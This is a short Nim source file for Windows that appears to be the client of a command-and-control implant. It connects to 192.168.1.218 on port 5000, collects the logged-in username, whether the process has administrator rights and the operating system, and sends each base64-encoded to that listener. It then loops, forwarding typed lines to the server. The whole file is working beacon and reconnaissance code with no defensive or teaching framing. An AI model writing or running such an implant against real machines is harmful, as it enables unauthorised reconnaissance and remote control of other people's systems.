import net
import std/base64
import winim/lean
import winim/inc/lm
import os

let client: net.Socket = newSocket()
client.connect("192.168.1.218", Port(5000))
echo "Trying to connect to: 192.168.1.218:5000"


var buffer = newString(UNLEN + 1)
var cb = DWORD buffer.len
GetUserNameA(&buffer, &cb)
buffer.setLen(cb - 1) # cb  including the terminating null character
echo "Running as: ", buffer
client.send(encode(buffer))



if os.isAdmin() == false:
  client.send(encode("0"))
else:
  client.send(encode("1"))

os.sleep(2000)
echo "OS: ", hostOS

client.send(encode(hostOS))

stdout.writeLine("Client: connected to server on address 192.168.1.218:5000")

while true:
  stdout.write("> ")
  let message: string = encode(stdin.readLine())
  
  client.send(message)

client.close()